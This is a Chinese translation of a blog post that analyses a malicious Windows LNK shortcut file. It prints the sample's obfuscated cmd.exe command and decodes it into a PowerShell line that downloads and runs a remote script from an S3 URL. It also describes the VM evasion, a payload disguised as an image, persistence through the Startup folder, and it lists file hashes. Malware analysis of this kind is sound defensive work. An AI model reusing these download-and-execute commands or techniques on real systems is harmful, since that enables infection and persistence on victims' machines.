@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>看我如何分析 Windows LNK 檔案攻擊</title>
+  <meta name="description" content="看我如何分析 Windows LNK 檔案攻擊">
+
+  <link rel="canonical" href="https://security-onigiri.github.io//2019/03/23/windows-lnk.html">
+  <link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+
+  
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-115432550-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+
+  
+  <link rel="stylesheet" type="text/css" href="/assets/security-onigiri-21a871a9ac629768c2c11f10324719959d911bc11f6684e2c84b398e6a3c1385.css" integrity="sha256-Iahxqaxil2jCwR8QMkcZlZ2RG8EfZoTiyEs5jmo8E4U=" crossorigin="anonymous">
+  <script type="text/javascript" src="/assets/security-onigiri-e0d01fc4e3608020eb67fbf8c150af399b5e674f1492ca1bbb751596a52a359d.js" integrity="sha256-4NAfxONggCDrZ/v4wVCvOZteZ08Uksobu3UVlqUqNZ0=" crossorigin="anonymous"></script>
+</head>
+
+  <body>
+    <header>
+  <nav class="navbar is-dark">
+		<div class="navbar-brand">
+			<a class="navbar-item" href="/">
+        <img src="/assets/icon_avatar-63fb8ef941697015c2720bd8d2764b00ecd3d2d75db4a8da9244966f417daf8e.png" integrity="sha256-Y/uO+UFpcBXCcgvY0nZLAOzT0tddtKjakkSWb0F9r44=" crossorigin="anonymous">
+			</a>
+      <div class="navbar-burger" data-target="navMenu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+		</div>
+		<div class="navbar-menu" id="navMenu">
+			<div class="navbar-start">
+        
+        
+        <a class="navbar-item" href="/about/">
+          <span class="icon">
+            <i class="fas fa-user"></i>
+          </span>
+          關於
+        </a>
+        
+        
+        
+        <a class="navbar-item" href="/tags/">
+          <span class="icon">
+            <i class="fas fa-tags"></i>
+          </span>
+          標籤
+        </a>
+        
+        
+        
+        <a class="navbar-item" href="/index.html">
+          <span class="icon">
+            <i class="fas fa-book"></i>
+          </span>
+          文章
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+			</div>
+			<div class="navbar-end">
+				<a class="navbar-item" href="/feed.xml">
+          <span class="icon">
+            <i class="fas fa-rss"></i>
+          </span>
+					訂閱
+				</a>
+			</div>
+		</div>
+	</nav>
+</header>
+
+    <main id="main" class=section">
+    <section class="container is-fluid">
+      <div class="hero-body">
+  <div class="container">
+    <h1 class="title is-spaced">
+      看我如何分析 Windows LNK 檔案攻擊
+    </h1>
+    <h2 class="subtitle">
+      <div class="content">
+        <span class="icon">
+          <i class="fas fa-link"></i>
+        </span>
+        <a href="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/">
+          https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/
+        </a>
+      </div>
+      <div class="level">
+        <div class="level-left">
+          <div class="level-item">
+            Translated by JohnThunder
+          </div>
+          <div class="level-item">
+            <div class="tags">
+              
+              
+              <a href="/tags/#Malware" class="tag">
+                Malware
+              </a>
+              
+              
+              <a href="/tags/#DFIR" class="tag">
+                DFIR
+              </a>
+              
+            </div>
+          </div>
+        </div>
+        <div class="level-right">
+          <div class="level-item">
+            Mar 23, 2019
+          </div>
+        </div>
+      </div>
+    </h2>
+  </div>
+</div>
+<div class="container">
+  <article>
+    <div class="content">
+      <h1 id="看我如何分析-windows-lnk-檔案攻擊"><strong>看我如何分析 Windows LNK 檔案攻擊</strong></h1>
+
+<p><strong>翻譯文章來源:</strong> dexters-lab.net</p>
+
+<p><strong>原文</strong>：https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/</p>
+
+<p>最近我的一個朋友分享了一個有趣的惡意樣本，它是一個微軟捷徑檔（LNK檔案），點擊（執行）後導致感染，在研究之前我並不知道2017的時候就有這樣的攻擊手法，這種類型的攻擊也有所增加，我感到很驚訝。
+在這篇文章中，我們將分析 LNK 檔案惡意軟體並揭示攻擊者如何使用多層混淆來逃避 AV 並最終丟棄惡意二進制檔案，我們還將研究如何對每個層進行去解混淆，並了解代碼正在做什麼。</p>
+
+<h2 id="動機"><strong>動機</strong></h2>
+
+<p>令我感興趣的原因是因為樣本本身看起來十分無辜，以及從社交工程的角度看它是多麼有說服力。作為一個捷徑，它對普通用戶來說並不可疑，因為它不是EXE。接下來，當用戶點擊時，會彈出一個瀏覽器視窗，它會打開鏈接 <a href="https://get.adobe.com/br/flashplayer/">https://get.adobe.com/br/flashplayer/</a> 這會讓用戶認為他的系統中缺少一個flash插件，這就是為什麼他無法打開/執行該檔案，但一旦他安裝了 Flash 播放器，當他再次嘗試打開捷徑且意識到它只是一個垃圾檔案時，已經太晚了。</p>
+
+<p>但實際發生的是它在背景中通過 shell 命令執行 Powershell 命令來下載 Powershell 腳本，該腳本執行主要惡意檔案的實際下載和安裝。它下載的檔案是一個 BMP 檔案，它看起來是一個無辜的圖像檔案，但它實際上是一個偽裝的 Powershell 檔案。</p>
+
+<h2 id="什麼是lnk檔案"><strong>什麼是LNK檔案？</strong></h2>
+<p>LNK 是 Microsoft Windows 用於指向可執行檔案或應用程序的捷徑方式檔案的檔案副檔名。LNK 檔案通常用於創建開始菜單和桌面快捷方式。LNK代表LiNK。LNK檔案可以通過更改圖標偽裝成合法檔案，但在此案例並沒有完成。</p>
+
+<h2 id="基本分析"><strong>基本分析</strong></h2>
+<p>以下是一般檔案屬性的外觀。</p>
+
+<p><a href="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png"><img src="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png" alt="" title="惡意鏈接檔案" /></a></p>
+
+<p>看一下_Shortcut_選項卡會給我們提供更多細節，下面是它的樣子。</p>
+
+<p><a href="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png"><img src="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png" alt="" title="LNK檔案定位應用程序" /></a></p>
+
+<p>正如您在 Target 欄位中看到的那樣，它指向 cmd.exe 並帶有一些參數。這是在執行此 LNK 檔案時運行的命令。但這不是整個命令。<br />
+捷徑的 Target 欄位最大為260個字元。任何比這更長的內容都不可見。但是 command line 參數的最大長度為 4096 個字符，因此我們無法在上面的窗口中看到整個命令。我必須用另一個工具來提取整個命令。</p>
+
+<h2 id="深入研究-lnk-檔案格式"><strong>深入研究 LNK 檔案格式</strong></h2>
+
+<p>使用 LNK 檔案分析工具，我們可以設法獲得整個嵌入在檔案裏面的命令，如下所示</p>
+
+<p><a href="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png"><img src="https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png" alt="" title="Extracting command from LNK file" /></a></p>
+
+<p>根據上面提取出的 LNK 檔案內容我們可以找到一些有趣的欄位：
+| KEY | VALUE |
+| — | — |
+| Relative path | ..\..\..\..\Windows\system32\cmd.exe |
+| Working Directory | %SystemRoot%\System32 |
+| Arguments | /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;… |</p>
+
+<p>讓我們仔細看看 Arguments，如下所示：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;c:\\Windows\\system32\\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;set L1U03HmUO6B9IcurCNNlo4=.com&amp;&amp; echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/ &amp;&amp;set aZM4j3ZhPLBn9MpuxaO= -win 1 &amp;&amp;set MlyavWfE=ndows&amp;&amp;set jA8Axao1xcZ=iEx&amp;&amp;set WMkgA3uXa1pXx=tRi&amp;&amp;set KNhGmAqHG5=bJe&amp;&amp;set 4kxhaz6bqqKC=LOad&amp;&amp;set rwZCnSC7T=nop&amp;&amp;set jcCvC=NEw&amp;&amp;set ZTVZ=wEbc&amp;&amp;set DABThzRuTT2hYjVOy=nt).dow&amp;&amp;set cwdOsPOdA08SZaXVp1eFR=t NeT.&amp;&amp;set Rb=Ers&amp;&amp;set j4HfRAqYXcRZ3R=hEll&amp;&amp;set Kpl01SsXY5tthb1=.bmp&amp;&amp;set vh7q6Aq0zZVLclPm=\\v1.0\\&amp;&amp;set 2Mh=pOw&amp;&amp;set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&amp;&amp;@echo off &amp;&amp; %SystemDrive% &amp;&amp; cd\ &amp;&amp; cd %SystemRoot%\\System32 &amp;&amp;echo %jA8Axao1xcZ%("%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')"); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! -  &gt;
+
+set x4OAGWfxlES02z6NnUkK=2whttpr0
+set L1U03HmUO6B9IcurCNNlo4=.com
+echo | start         %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/
+set aZM4j3ZhPLBn9MpuxaO= -win 1
+set MlyavWfE=ndows
+set jA8Axao1xcZ=iEx
+set WMkgA3uXa1pXx=tRi
+set KNhGmAqHG5=bJe
+set 4kxhaz6bqqKC=LOad
+set rwZCnSC7T=nop
+set jcCvC=NEw
+set ZTVZ=wEbc
+set DABThzRuTT2hYjVOy=nt).dow
+set cwdOsPOdA08SZaXVp1eFR=t NeT.
+set Rb=Ers
+set j4HfRAqYXcRZ3R=hEll
+set Kpl01SsXY5tthb1=.bmp
+set vh7q6Aq0zZVLclPm=\\v1.0\\
+set 2Mh=pOw
+set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%
+@echo off
+%SystemDrive%
+cd\\
+cd %SystemRoot%\\System32
+echo %jA8Axao1xcZ%("%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')"); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\\Internet Explorer\\iexplore.exe
+</code></pre></div></div>
+
+<p>每一行都是shell命令。第一行是設置一些環境變數然後在第3行，最後一行使用這些環境變數來組裝這些變量並執行它們。這種組裝和反組譯變數名的方法使代碼更難閱讀。</p>
+
+<p>上面混淆的 shell 腳本解碼為以下兩個命令：</p>
+
+<ol>
+  <li><code class="highlighter-rouge">C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;set L1U03HmUO6B9IcurCNNlo4=.com &amp;&amp; echo | start https://get.adobe.com/br/flashplayer/</code> 此命令在瀏覽器打開adobe flashplayer安裝頁面。</li>
+  <li><code class="highlighter-rouge">echo iEx("iEx(New-Object Net.WebClient).DownloadString('hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp')"); | WindowsPowershell\v1.0\Powershell -nop -win 1 --%ProgramFiles%\\Internet Explorer\\iexplore.exe</code> 這個命令實際下載了第二層 Powershell ，該檔案偽裝成 URL 中的 BMP 檔案</li>
+</ol>
+
+<h2 id="解碼第二層-powershell"><strong>解碼第二層 Powershell</strong></h2>
+
+<p>由上面的LNK檔案下載的Powershell腳本可以在此<a href="https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/jureklarj934t9oi4.ps1">點我</a> fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 上找到，它被嚴重混淆，使用<a href="http://www.powertheshell.com/obfuscationmode/">ISESteriods</a>進行混淆。我確實設法解碼腳本，可以在此<a href="https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/decoded.ps1">點我</a>上找到可讀代碼。</p>
+
+<p>執行腳本執行以下操作：</p>
+
+<ol>
+  <li>檢查它是否在虛擬機內部運行，如果它正在運行，則它不執行其餘命令並退出。否則，它將處理為後續步驟。該腳本檢查以下虛擬機列表：
+    <ol>
+      <li>VirtualBox的</li>
+      <li>VMware虛擬平台</li>
+      <li>虛擬機</li>
+      <li>HVM domU</li>
+    </ol>
+  </li>
+  <li>然後它創建一個名為 444444444444 的 Mutex，這是為了確保該電腦只運行一個這個程序。</li>
+  <li>如果上一步成功，則下載一個zip，再次偽裝成一個圖像檔案，來自以下URL hxxps：//s3-eu-west-1[.]amazonaws[.]com/juremasobra2/image2.png，Hash 即887eafc19419df5119a829fd05d898503b7a0217”</li>
+  <li>將PNG檔案重命名為ZIP檔案</li>
+  <li>從包含DLL 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 的zip檔案中提取內容，並將此檔案複製到啟動資料夾。</li>
+  <li>然後它通過在 Startup 資料夾中創建捷徑方式檔案來讓它能夠繼續存在電腦裡面，此快捷方式檔案（第二個 LNK）在命令 shell 中調用 run32.dll 來運行惡意 DLL 二進制檔案。由於 run32.dll 是一個內置的簽名二進制檔案，因此不會引起更多懷疑。例如，此命令 <em>rundll32.exe shell32.dll，ShellExec_RunDLL notepad.exe</em> 將啟動 notepad.exe。</li>
+  <li>然後腳本會停留 40 秒，然後重新啟動機器。</li>
+</ol>
+
+<p>通過上述攻擊，技術攻擊者試圖將其惡意DLL二進制檔案隱藏在合法二進制檔案後面。</p>
+
+<p>可以在此<a href="https://blogs.technet.microsoft.com/motiba/2017/11/04/chasing-adversaries-with-autoruns-evading-techniques-and-countermeasures/">鏈接</a>上找到有關這手法的更多信息</p>
+
+<h2 id="所有的檔案"><strong>所有的檔案</strong></h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>SHA1</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>af6df15050dea1a756bb99bb0597d7072c2aee4c</td>
+      <td>惡意 LNK 檔案</td>
+    </tr>
+    <tr>
+      <td>fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5</td>
+      <td>Powershell 檔案由上述 LNK 下載</td>
+    </tr>
+    <tr>
+      <td>887eafc19419df5119a829fd05d898503b7a0217</td>
+      <td>ZIP 檔案由上述 Powershell 下載</td>
+    </tr>
+    <tr>
+      <td>92be09ca93ad6a8b04b7e2e2087fc6884fef1f63</td>
+      <td>惡意 DLL 檔案由上述 ZIP 檔案解開</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="參考"><strong>參考</strong></h2>
+
+<ol>
+  <li><a href="https://www.dfir.training/windows/lnk/116-windows-shortcut-file-lnk-format/file">LNK file format</a></li>
+  <li><a href="https://securitynews.sonicwall.com/xmlpost/lnk-file-is-actively-being-leveraged-to-run-file-less-powershell-script/">Other attacks similar to this</a></li>
+  <li><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/rising-trend-attackers-using-lnk-files-download-malware/">TreadMicro blog no treads on this type of attacks</a></li>
+</ol>
+
+    </div>
+  </article>
+  <section class="section">
+    
+
+  </section>
+</div>
+
+    </section>
+    </main>
+    <footer class="footer">
+  <div class="container has-text-centered">
+    <div class="content">
+      Theme by
+      <a class="item" href="https://github.com/security-onigiri/security-onigiri">
+        <span class="icon">
+          <i class="fab fa-github"></i>
+        </span>
+        security-onigiri
+      </a>
+    </div>
+  </div>
+</footer>
+
+  </body>
+</html>
